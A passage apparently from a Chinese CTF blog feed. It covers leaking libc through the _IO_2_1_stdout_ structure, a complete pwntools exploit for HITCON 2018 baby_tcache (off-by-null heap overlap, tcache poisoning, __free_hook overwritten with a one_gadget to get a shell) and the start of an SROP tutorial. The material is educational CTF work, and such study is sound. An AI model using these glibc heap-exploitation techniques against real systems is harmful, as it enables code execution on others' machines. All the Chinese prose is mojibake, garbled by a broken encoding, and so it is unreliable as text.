fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶è¦ä½¿å¾—åˆ¤æ–­æˆç«‹ï¼Œé‚£å°±<code>|_IO_IS_APPENDING</code>å®ƒå°±å¯ä»¥äº†ï¼š</p><blockquote><p><code>_flags |= _IO_IS_APPENDING # _flags = 0xfbad1800</code></p></blockquote><p>æ‰€ä»¥å®Œæ•´çš„è°ƒç”¨é“¾ä¸ºï¼š<code>puts -&gt; IO_puts -&gt; _IO_new_file_xsputn -&gt; _IO_new_file_overflow -&gt; _IO_do_write -&gt; new_do_write -&gt; _IO_SYSWRITE</code></p><p>èƒ½å¤ŸæˆåŠŸè°ƒç”¨<code>_IO_SYSWRITE</code>ä¹‹åè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¾“å‡ºçš„å¤§å°é—®é¢˜ï¼Œå›çœ‹ä¹‹å‰çš„<code>IO_FILE</code>ç»“æ„ä½“ä¸­æœ‰ä¸ªå«<code>_IO_write_base;</code>ï¼Œå…¶å®åªè¦ä¿®æ”¹å®ƒçš„å¤§å°ç¨å¾®å°ä¸€ç‚¹ï¼Œå°±èƒ½è¾“å‡ºä¸<code>libc</code>æŒ¨å¾—å¾ˆè¿‘çš„å€¼ï¼Œè‡³äºä¸Šé¢å‡ ä¸ªå…³äº<code>read</code>çš„æˆå‘˜ï¼Œè¦†ç›–æˆ0å°±å¥½ï¼Œå…¶å®ä¸å¤ªæ˜ç™½è¿™å…¶ä¸­çš„é“ç†ï¼ŒçŒœæµ‹æ˜¯ä¸ºäº†æ”¾ç½®å®ƒæ…å±å§ï¼Œè®¾ç½®æˆ0ç®€å•åˆç²—æš´â€¦.</p><h4 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h4><p>åœ¨æ¯”èµ›ä¸­æœ‰ä¸¤ç§æƒ…å†µæ¥æ³„éœ²ï¼Œä¸€ä¸ªæ˜¯åœ¨<code>libc-2.23</code>ï¼Œå¦ä¸€ä¸ªæ˜¯åœ¨<code>libc-2.27</code>ä¸‹ï¼Œæœ¬è´¨å°±æ˜¯ä¸€ä¸ªç”¨<code>fastbin</code>æ¥åŠ«æŒ<code>IO_2_1_stdout</code>ï¼Œä¸€ä¸ªç”¨<code>tache</code>æ¥åŠ«æŒ<code>IO_2_1_stdout</code>ï¼Œ<code>fastbin</code>å°±å¾—æ‰¾ä¸€ä¸ª<code>/x7f</code>å¤§å°çš„å †å—æ‰èƒ½é“¾å…¥<code>fastbin</code>ï¼Œ<code>tache</code>ç›´æ¥ä¿®æ”¹<code>fd</code>æŒ‡é’ˆå³å¯</p><h5 id="libc-2-27"><a href="#libc-2-27" class="headerlink" title="libc-2.27"></a>libc-2.27</h5><p><strong>HITCON 2018 PWN baby_tcache</strong></p><p>ç¨‹åºç®€å•çš„ç¦»è°±ï¼Œç¬¬ä¸€æ¬¡çœ‹è§åªæœ‰ä¸¤ä¸ªé€‰é¡¹çš„èœå•é¢˜ï¼š</p><p><code>add</code>å‡½æ•°é‡Œé¢çš„<code>chunk_ptr[size] = 0;</code>å­˜åœ¨<code>off-by-null</code>ï¼ŒçœŸçš„æ˜¯ä¸åšå¤šç‚¹é¢˜ï¼Œå¯¹æ¼æ´çš„æ•æ„Ÿåº¦çœŸçš„ä¸é«˜ï¼Œçœ‹åŠå¤©æ²¡çœ‹å‡ºæ¥â€¦.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *chunk_ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !chunk_list[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = read();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  chunk_ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk_ptr )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  read_0(chunk_ptr, size);</span><br><span class="line">  chunk_ptr[size] = <span class="number">0</span>;</span><br><span class="line">  chunk_list[i] = chunk_ptr;</span><br><span class="line">  v0 = chunk_size;</span><br><span class="line">  chunk_size[i] = size;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>free</code>å°±æ²¡å•¥é—®é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = read();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( chunk_list[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(chunk_list[v1], <span class="number">218</span>, chunk_size[v1]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[v1]);</span><br><span class="line">    chunk_list[v1] = <span class="number">0LL</span>;</span><br><span class="line">    chunk_size[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;:)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£æ—¢ç„¶æœ‰<code>off-by-null</code>ï¼Œé‚£åˆ©ç”¨çš„æ–¹æ³•ä¹Ÿå°±å¾ˆæ˜ç¡®äº†ï¼åšå †å ï¼Œåšæ³•ä¹Ÿæ˜¯ååˆ†çš„ç®€å•ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œå¿˜äº†å°±å»çœ‹çœ‹<code>off-by-one</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(0x500)  #0</span><br><span class="line">add(0x70)    #1</span><br><span class="line">add(0x5f0)  #2</span><br><span class="line">add(0x20)         #3</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(0x78,&#x27;A&#x27;*0x70+p64(0x590))</span><br><span class="line"></span><br><span class="line">free(2)                </span><br></pre></td></tr></table></figure><p>å †å å®Œæˆä¹‹åï¼Œåœ¨<code>tache</code>é‡Œé¢é“¾å…¥<code>main_arena</code>ï¼Œå°±å¯ä»¥ä¿®æ”¹å®ƒçš„åä¿©ä¸ªæ¯”ç‰¹åŠ«æŒåˆ°<code>IO_2_1_stdout</code>ï¼Œè™½ç„¶ç¨‹åºå¼€äº†ASLRï¼Œä½†å®ƒçš„å12ä¸ª<code>bit</code>æ˜¯å§‹ç»ˆä¸ä¼šå˜çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜æœ‰4ä¸ª<code>bit</code>ä¼šå˜ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿåªèƒ½çŒœä¸€ä¸ªå€¼ç„¶åæ¥çˆ†ç ´ï¼Œå‡ ç‡ä¸º<code>1/16</code>ï¼ˆä¸€å¼€å§‹å¯¹çˆ†ç ´æ„Ÿè§‰å¥½å‰å®³çš„æ ·å­ï¼Œå…¶å®å°±æ˜¯å†™ä¸ª<code>try except</code>â€¦.ï¼‰</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">opt</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(opt))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x500</span>)  <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x70</span>)    <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x5f0</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x500</span>)  <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">&#x27;A&#x27;</span>)         <span class="comment">#3</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x78</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0x590</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)                </span><br><span class="line">    free(<span class="number">0</span>)                </span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;\x60\xb7&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x78</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0x0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x90&#x27;</span>) <span class="comment">#change the _flag</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    data = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = data - <span class="number">4114403</span></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f322</span> <span class="comment">#0x4f2c5 0x4f322 0x10a38c</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base :&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,p64(free_hook))</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    add(<span class="number">0x80</span>,p64(free_hook))</span><br><span class="line">    add(<span class="number">0x80</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    a = <span class="number">16</span></span><br><span class="line">    <span class="keyword">while</span>(a) :</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            p = process(<span class="string">&#x27;./baby_tcache&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.27.so&quot;</span>&#125;)<span class="comment">#,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;</span></span><br><span class="line">            elf = ELF(<span class="string">&#x27;./baby_tcache&#x27;</span>)</span><br><span class="line">            libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">            <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">            exp()</span><br><span class="line">            a -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">            <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            p.interactive()</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://bbs.pediy.com/thread-249713.htm">Tcacheåˆ©ç”¨æ€»ç»“</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113867648?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163370995516780274138633%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163370995516780274138633&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-113867648.pc_v2_rank_blog_default&utm_term=_IO_2_1_stdout%E6%B3%84%E9%9C%B2libc&spm=1018.2226.3001.4450">HITCON 2018 PWN baby_tcacheè¶…è¯¦ç»†è®²è§£</a></p><p><a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/#more">IO_FILEæ³„éœ²libc</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFå°çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SROP</title>
      <link href="/2021/10/08/SROP/"/>
      <url>/2021/10/08/SROP/</url>
      
        <content type="html"><![CDATA[<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><blockquote><p>åœ¨ä¸åŒç‰ˆæœ¬çš„ Unix ç³»ç»Ÿä¸­è¢«ä½¿ç”¨äº† 40 å¤šå¹´çš„ Signal æœºåˆ¶ï¼Œå­˜åœ¨ä¸€ä¸ªå¾ˆå®¹æ˜“è¢«æ”»å‡»è€…åˆ©ç”¨çš„è®¾è®¡ç¼ºé™·ï¼Œé’ˆå¯¹è¿™ç§æ”»å‡»çš„æ‰‹æ³•å«åšSROPï¼Œå’Œä¼ ç»Ÿçš„ ROP æ”»å‡»ç›¸æ¯”æ˜¾å¾—æ›´åŠ ç®€å•ï¼Œå¯é ï¼Œå¯ç§»æ¤ï¼Œè™½ç„¶ç¦»æå‡ºçš„æ—¶é—´å·²ç»è¿‡å»äº†è®¸ä¹…ï¼Œä½†åœ¨CTFçš„èµ›åœºä¸Šä»ç„¶å­˜åœ¨ç€SROPçš„æ”»å‡»æ‰‹æ³•ï¼Œä¸è¿‡åœ¨CTFçš„SROPæ›´å¤šçš„æ˜¯ä½œä¸ºä¸€ç§è¾…åŠ©ROPæ¥ä½¿ç”¨ï¼Œè®©<code>exp</code>çš„ç¼–å†™æ›´åŠ çš„ç®€ä¾¿ï¼Œæ¯”å¦‚ORW<code>+</code>SROPã€‚</p></blockquote><p>æ­¤æ”»å‡»æ‰‹æ³•é¦–æ¬¡æå‡ºæ˜¯åœ¨å®‰å…¨é¡¶ä¼šOakland 2014ï¼ŒåŸæ–‡çœ‹çš„å¤ªéš¾å—äº†ï¼Œçœ‹çœ‹<a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">ä¼šè®®PPT</a>å°±å¥½äº†ï¼ŒSROPä¹Ÿç®—ä½œæ¯”è¾ƒé«˜çº§ä¸€ç‚¹çš„ROPäº†ï¼Œæ¥ä¸‹æ¥æ…¢æ…¢çœ‹å®ƒæ˜¯æ€ä¹ˆæ”»å‡»çš„</p><h4 id="Signal-æœºåˆ¶"><a href="#Signal-æœºåˆ¶" class="headerlink" title="Signal æœºåˆ¶"></a>Signal æœºåˆ¶</h4><p>åœ¨å¼€å§‹ä»‹ç»SROPä¹‹å‰ï¼Œè‚¯å®šè¦ä»‹ç»Signal æœºåˆ¶ï¼Œå°±æ‹¿å‡ºè€ç”Ÿå¸¸è°ˆçš„ä¸€å¼ Signal ä¿¡å·çš„è°ƒç”¨æµç¨‹å›¾ï¼š</p><img src="/2021/10/08/SROP/1-1633624930554.png" class=""><p>â‘ å†…æ ¸å‘è¿›ç¨‹å‘é€Signal ä¿¡å·ï¼Œæ­¤è¿›ç¨‹æŒ‚èµ·å¹¶è¿›å…¥ç”¨æˆ·æ€ç¨‹åºï¼Œè¿›è¡Œ<code>ucontext save</code>ï¼Œå³å¾€æ ˆä¸Šå‹å…¥<code>ucontext</code>å’Œ<code>siginfo</code>ï¼Œä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ Signal ä¿¡æ¯</p><img src="/2021/10/08/SROP/2-1633624936917.png" class=""><p>æœ€åå‹å…¥æŒ‡å‘ <code>sigreturn</code> çš„ç³»ç»Ÿè°ƒç”¨åœ°å€ï¼Œéœ€è¦æ³¨æ„åˆ°çš„ä¸€ç‚¹æ˜¯ï¼Œè¿™ä¸€åˆ‡çš„æ“ä½œéƒ½æ˜¯åœ¨æ ˆä¸Šè¿›è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ®µåŒºåŸŸåœ¨æŸç§ç¨‹åº¦ä¸Šæ˜¯å¯æ§çš„ï¼Œè¿™å°±æ˜¯é—®é¢˜çš„æ‰€åœ¨ï¼ï¼ï¼</p><img src="/2021/10/08/SROP/3-1633624945177.png" class=""><p>â‘¡è·³è½¬åˆ°æ³¨å†Œè¿‡çš„ <code>signal handler</code> ä¸­å¤„ç†ç›¸åº”çš„ Signalã€‚å› æ­¤ï¼Œå½“ <code>signal handler</code> æ‰§è¡Œå®Œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œ <code>sigreturn</code> ä»£ç </p><p>â‘¢<code>signal handler</code> è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ<code> sigreturn</code> ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° <code>pop</code> å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å…¶ä¸­ï¼Œ32 ä½çš„ <code>sigreturn</code> çš„è°ƒç”¨å·ä¸º 77ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15</p><h4 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h4><p>ä¸Šé¢å·²ç»è®²åˆ°ä¿å­˜çš„å‚æ•°ï¼ˆåŒ…æ‹¬å¯„å­˜å™¨ç­‰ä¿¡æ¯ï¼‰éƒ½æ˜¯å¤„äºç”¨æˆ·æ€ä¸­ï¼Œå¹¶ä¸”å¯ä»¥è¿›è¡Œè¯»å†™ï¼Œå†åŠ ä¸Šå†…æ ¸å¹¶ä¸ä¼šæ£€æŸ¥å®ƒçš„å‚æ•°æ˜¯å¦ç»™æ”¹å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ è¿™äº›å¯„å­˜å™¨çš„å‚æ•°ï¼Œå½“ç³»ç»Ÿæ‰§è¡Œå®Œ <code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œä¼šæ‰§è¡Œ<code> pop</code> æŒ‡ä»¤æ¥æ¢å¤ç›¸åº”å¯„å­˜å™¨çš„å€¼ï¼Œå½“æ‰§è¡Œåˆ° <code>rip</code>æ—¶ï¼Œå°±ä¼šå°†ç¨‹åºæ‰§è¡ŒæµæŒ‡å‘ <code>syscall</code> åœ°å€ï¼Œæ—¢ç„¶èƒ½è¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯æˆ‘ä»¬åªè¦åœ¨å¯¹åº”çš„å¯„å­˜å™¨ä¸Šä¼ªé€ æˆ‘ä»¬æƒ³è¦çš„å€¼å°±èƒ½è¿›å…¥ä»»ä½•æƒ³è¦çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼ä¸‹é¢åˆæ˜¯è€ç”Ÿå¸¸è°ˆçš„ä¸€å¼ å›¾ï¼Œç»“æœå¾ˆæ˜æ˜¾ï¼Œå¦‚æœç”¨ä¸‹åˆ—å¯„å­˜å™¨çš„å€¼æ¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨å°±èƒ½<code>getshell</code>ï¼š</p><img src="/2021/10/08/SROP/4.png" class=""><p>é‚£è¦å½¢æˆè°ƒç”¨é“¾å‘¢ï¼Ÿå›æƒ³åŸå§‹çš„ROPï¼Œæ˜¯ä¸æ˜¯é…åˆ<code>ret</code>å°±å¯ä»¥å½¢æˆROPé“¾ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯ï¼Œä¸è¿‡å¯¹åº”çš„æ ˆé¡¶ä¹Ÿè¦æŒ‡å‘ä¸‹ä¸€ä¸ªä¼ªé€ <code>syscall</code>çš„ä½ç½®ï¼š</p><img src="/2021/10/08/SROP/5.png" class=""><p>é™¤äº†æ‰‹åŠ¨å»å¸ƒç½®å¯„å­˜å™¨çš„å€¼ä¹‹å¤–ï¼Œ<code>pwntool</code>è¿˜æœ‰ä¸€ä¸ªé›†æˆçš„å·¥å…·â€”-<code>SigreturnFrame() </code>æ¨¡å—ï¼Œåœ¨CTFçš„é¢˜ç›®ä¸­ç»å¸¸ä¼šä½¿ç”¨åˆ°å®ƒï¼Œå…¶å®å®ƒå°±æ˜¯æŠŠæ ˆå¸§é‡Œé¢æ¯ä¸ªå¯„å­˜å™¨çš„å€¼å°±æ ‡è®°å¥½äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç”Ÿæˆä¸€ä¸ª<code>SigreturnFrame() </code>æ¨¡å—ï¼Œç„¶åå†å¾€è¿™ä¸ªæ¨¡å—é‡Œé¢æ”¾å…¥å¯„å­˜å™¨çš„å€¼å°±å¯ä»¥äº†ï¼Œä¸‹é¢æ˜¯åœ¨<code>i386</code> ä¸Šè°ƒç”¨<code>mprotect</code>ï¼Œå…·ä½“å¯ä»¥å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://docs.pwntools.com/en/stable/rop/srop.html?highlight=SigreturnFrame">Sigreturn Oriented Programming</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.clear(arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = SigreturnFrame(kernel=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>unpack_many(<span class="built_in">bytes</span>(s))</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">assert</span> <span class="built_in">len</span>(s) == <span class="number">80</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.eax = <span class="number">125</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.ebx = <span class="number">0x00601000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.ecx = <span class="number">0x1000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.edx = <span class="number">0x7</span></span><br><span 